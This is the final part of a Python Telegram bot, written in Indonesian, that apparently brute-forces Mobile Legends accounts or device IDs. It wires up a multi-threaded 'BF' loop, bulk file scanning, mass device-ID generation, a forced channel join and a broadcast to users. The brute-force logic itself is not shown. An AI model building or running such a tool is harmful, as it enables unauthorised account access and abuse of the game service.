                new_task = asyncio.create_task(run_bf_loop(update, context, s))
                s["task"] = new_task
                await q.answer("🔁 Loop dilanjutkan!", show_alert=False)
            except Exception as e:
                await q.answer(f"❌ Gagal resume: {e}", show_alert=True)
        else:
            await q.answer("Tidak ada yang dipause", show_alert=True)

    elif data == "bf_delete":
        s["stop_flag"] = True
        s["pause_flag"] = False
        s["running"] = False
        task = s.get("task")
        if task and not task.done():
            task.cancel()
        try:
            await q.message.delete()
        except Exception:
            try:
                await context.bot.delete_message(
                    chat_id=q.message.chat_id, message_id=q.message.message_id)
            except Exception:
                pass
        try:
            await q.answer("🗑️ Progress BF dihapus.", show_alert=False)
        except Exception:
            pass

    elif data == "help":
        await q.message.reply_text(HELP_TEXT, parse_mode="Markdown")


# ══════════════════════════════════════════════════════════════════════
# DEBUG + ERROR
# ══════════════════════════════════════════════════════════════════════
async def debug_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if DEBUG_MODE and update.message:
        print(f"[DEBUG] {update.effective_user.id} | {update.message.text}")


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    err = context.error
    print(f"[ERROR] {type(err).__name__}: {err}")

    if isinstance(err, Conflict):
        print("⚠️ CONFLICT — bot lain mungkin jalan dengan token yang sama")
    elif isinstance(err, InvalidToken):
        print("⚠️ INVALID TOKEN")
    elif isinstance(err, telegram.error.RetryAfter):
        print(f"⚠️ RATE LIMIT — tunggu {err.retry_after}s")
        await asyncio.sleep(err.retry_after)
    elif isinstance(err, telegram.error.NetworkError):
        print("⚠️ NETWORK ERROR — koneksi ke Telegram bermasalah")


# ══════════════════════════════════════════════════════════════════════
# STARTUP NOTIFICATION
# ══════════════════════════════════════════════════════════════════════
async def notify_users_bot_ready(app: Application):
    users = load_users()
    users.discard(OWNER_ID)
    total = len(users)

    now = BOT_START_DATETIME
    hari_map = {
        "Monday": "Senin", "Tuesday": "Selasa", "Wednesday": "Rabu",
        "Thursday": "Kamis", "Friday": "Jumat", "Saturday": "Sabtu", "Sunday": "Minggu"
    }
    bulan_map = {
        "January": "Januari", "February": "Februari", "March": "Maret",
        "April": "April", "May": "Mei", "June": "Juni", "July": "Juli",
        "August": "Agustus", "September": "September", "October": "Oktober",
        "November": "November", "December": "Desember"
    }
    hari = hari_map.get(now.strftime("%A"), now.strftime("%A"))
    bulan = bulan_map.get(now.strftime("%B"), now.strftime("%B"))
    time_str = now.strftime(f"{hari}, %d {bulan} %Y — %H:%M:%S")

    text = (
        "🟢 *BOT IS READY* 🟢\n\n"
        f"📅 *{time_str}*\n\n"
        "Bot MLBB Combined telah aktif dan siap digunakan!\n\n"
        "Ketik /start untuk memulai."
    )

    print(f"[STARTUP] Mengirim notifikasi ke {total} user...")
    success = 0
    fail = 0
    for uid in users:
        try:
            await app.bot.send_message(chat_id=uid, text=text, parse_mode="Markdown")
            success += 1
        except Exception as e:
            fail += 1
            print(f"[STARTUP] {uid} err: {e}")
        await asyncio.sleep(0.05)
    print(f"[STARTUP] Selesai — OK: {success}, Gagal: {fail}")


# ══════════════════════════════════════════════════════════════════════
# POST INIT
# ══════════════════════════════════════════════════════════════════════
async def post_init(app: Application):
    print("🔄 Delete webhook...")
    try:
        await app.bot.delete_webhook(drop_pending_updates=True)
        print("✅ Webhook cleared.")
    except Exception as e:
        print(f"⚠️ {e}")
    try:
        me = await app.bot.get_me()
        print(f"🤖 Bot: @{me.username} (id: {me.id})")
    except Exception as e:
        print(f"⚠️ {e}")
    if REQUIRED_CHANNEL:
        print(f"📢 Force Join: {REQUIRED_CHANNEL}")
        try:
            chat = await app.bot.get_chat(REQUIRED_CHANNEL)
            print(f"   Channel OK: {chat.title}")
            try:
                me = await app.bot.get_me()
                m = await app.bot.get_chat_member(REQUIRED_CHANNEL, me.id)
                if m.status in ("administrator", "creator"):
                    print(f"   ✅ Bot admin")
                else:
                    print(f"   ⚠️ Bot BUKAN admin (status: {m.status})")
            except Exception as e:
                print(f"   ⚠️ Cek admin: {e}")
        except Exception as e:
            print(f"   ❌ Channel tidak ditemukan: {e}")

    asyncio.create_task(notify_users_bot_ready(app))


# ══════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════
def main():
    if not BOT_TOKEN or ":" not in BOT_TOKEN or BOT_TOKEN.startswith("ISI_"):
        print("❌ BOT_TOKEN tidak valid!")
        sys.exit(1)

    print("=" * 60)
    print("🤖 MLBB COMBINED BOT (BF Loop + Bulk Scan + GenDevID)")
    print("=" * 60)
    print(f"Token  : {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
    print(f"Owner  : {OWNER_ID}")
    print(f"Fitur  : BF Loop | Bulk Scan | GenDevID | Status")
    print("=" * 60)

    try:
        app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    except Exception as e:
        print(f"❌ Build gagal: {e}")
        sys.exit(1)

    conv_bf = ConversationHandler(
        entry_points=[
            CommandHandler("bf", cmd_bf),
            CallbackQueryHandler(cb_bf_start, pattern="^bf_start$"),
        ],
        states={
            WAITING_DEVICE_IDS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_device_ids)
            ],
            WAITING_THREADS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_threads)
            ],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        per_user=True, per_chat=True,
    )

    async def gen_start_from_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
        q = update.callback_query
        await q.answer()
        register_user(q.from_user.id)
        if not await check_user_joined(context.bot, q.from_user.id):
            await send_join_prompt(q)
            return ConversationHandler.END
        await q.message.reply_text(
            "🆔 *GENERATE DEVICE ID*\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📝 Masukkan jumlah Device ID (1-{MAX_GEN_DEVICES:,})\n\n"
            "Contoh: `100`\n\n"
            "Ketik /cancel untuk batal.",
            parse_mode="Markdown")
        return WAITING_GEN_COUNT

    conv_gen = ConversationHandler(
        entry_points=[
            CommandHandler("gen", cmd_gen),
            CallbackQueryHandler(gen_start_from_cb, pattern="^gen_start$"),
        ],
        states={
            WAITING_GEN_COUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_gen_count)
            ],
            WAITING_GEN_PLATFORM: [
                CallbackQueryHandler(gen_platform_handler, pattern="^gen_")
            ],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        per_user=True, per_chat=True,
    )

    conv_broadcast = ConversationHandler(
        entry_points=[CommandHandler("broadcast", cmd_broadcast)],
        states={
            WAITING_BROADCAST: [
                MessageHandler(
                    filters.TEXT | filters.PHOTO | filters.VIDEO |
                    filters.Document.ALL | filters.Sticker.ALL,
                    receive_broadcast)
            ],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        per_user=True, per_chat=True,
    )

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("bulk", cmd_bulk))

    app.add_handler(conv_bf)
    app.add_handler(conv_gen)
    app.add_handler(conv_broadcast)

    app.add_handler(MessageHandler(filters.Document.ALL, handle_bulk_file))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.ALL, debug_handler))

    app.add_error_handler(error_handler)

    print("✅ Bot running...")
    try:
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except KeyboardInterrupt:
        print("\n👋 Stop.")
    except Exception as e:
        print(f"❌ Crash: {e}")
        logger.exception("crash")


if __name__ == "__main__":
    main()
